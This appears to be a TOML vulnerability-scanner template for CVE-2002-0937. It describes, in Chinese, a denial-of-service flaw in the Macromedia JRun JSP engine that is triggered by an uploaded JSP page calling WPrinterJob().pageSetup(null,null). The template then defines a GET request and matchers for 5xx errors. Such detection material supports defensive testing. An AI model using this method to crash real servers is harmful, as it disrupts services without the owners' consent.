[info]
author = "ave"
description = "验证 Macromedia JRun 3.0/3.1/4.0 JSP 引擎拒绝服务漏洞。攻击者上传包含 WPrinterJob().pageSetup(null,null) 调用的恶意 JSP 页面并访问它，即可触发 JSP 引擎崩溃导致拒绝服务。"
id = "POC-AVE-2002-0481"
name = "CVE-2002-0937 PoC"
severity = "medium"
tags = ["ave-2002-0481"]
vuln_id = [
    "CVE-2002-0937",
    "AVE-2002-0481",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/test_cve_2002_0937.jsp"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "status"
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Internal Server Error",
    "Service Unavailable",
    "Bad Gateway",
    "Gateway Timeout",
]
